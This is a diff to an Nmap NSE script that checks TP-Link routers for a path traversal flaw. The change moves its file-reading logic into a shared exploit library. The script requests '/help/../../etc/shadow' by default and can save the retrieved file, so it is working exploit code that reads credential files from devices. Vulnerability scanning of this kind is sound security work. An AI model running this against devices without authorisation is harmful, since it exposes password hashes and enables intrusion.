@@ -71,38 +71,12 @@ local shortport = require "shortport"
 local stdnse = require "stdnse"
 local string = require "string"
 local vulns = require "vulns"
+local exploit = require "exploit"
 
 portrule = shortport.http
 
 local TRAVERSAL_QRY = "/help/../.."
 local DEFAULT_REMOTE_FILE = "/etc/shadow"
-
----
---Writes string to file
---Taken from: hostmap.nse
-local function write_file(filename, contents)
-  local f, err = io.open(filename, "w")
-  if not f then
-    return f, err
-  end
-  f:write(contents)
-  f:close()
-  return true
-end
-
----
--- Checks if device is vulnerable by requesting the shadow file and looking for the pattern 'root:'
----
-local function check_vuln(host, port)
-  local evil_uri = TRAVERSAL_QRY..DEFAULT_REMOTE_FILE
-  stdnse.debug1("HTTP GET %s", evil_uri)
-  local response = http.get(host, port, evil_uri)
-  if response.body and response.status==200 and response.body:match("root:") then
-    stdnse.debug1("Pattern 'root:' found.")
-    return true
-  end
-  return false
-end
 
 ---
 -- MAIN - The script checks for vulnerable devices by attempting to read "etc/shadow" and finding the pattern "root:".
@@ -131,27 +105,15 @@ Possibly vulnerable (Based on the same firmware): WR743ND,WR842ND,WA-901ND,WR941
   }
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 
-  local is_vulnerable = check_vuln(host, port)
-  if is_vulnerable then
+  local status, lfi_success, contents, _, outfile_status, outfile_err = exploit.lfi_check(host, port, TRAVERSAL_QRY, rfile, filewrite)
+  if lfi_success then
     vuln.state = vulns.STATE.EXPLOIT
-    response = http.get(host, port, TRAVERSAL_QRY..rfile)
-    if response.body and response.status==200 then
-      stdnse.debug2("%s", response.body)
-      if response.body:match("Error") then
-        stdnse.debug1("[Error] File not found:%s", rfile)
-        vuln.extra_info = string.format("%s not found.\n", rfile)
-        return vuln_report:make_output(vuln)
-      end
-      local  _, _, rfile_content = string.find(response.body, 'SCRIPT>(.*)')
-      vuln.extra_info = rfile.." :\n"..rfile_content
-      if filewrite then
-        local status, err = write_file(filewrite,  rfile_content)
-        if status then
-          vuln.extra_info = string.format("%s%s saved to %s\n", vuln.extra_info, rfile, filewrite)
-        else
-          vuln.extra_info = string.format("%sError saving %s to %s: %s\n", vuln.extra_info, rfile, filewrite, err)
-        end
-      end
+    local  _, _, rfile_content = string.find(contents, 'SCRIPT>(.*)')
+    vuln.extra_info = rfile.." :\n"..rfile_content
+    if outfile_status then
+      vuln.extra_info = string.format("%s%s saved to %s\n", vuln.extra_info, rfile, filewrite)
+    else
+      vuln.extra_info = string.format("%sError saving %s to %s: %s\n", vuln.extra_info, rfile, filewrite, outfile_err)
     end
   end
   return vuln_report:make_output(vuln)
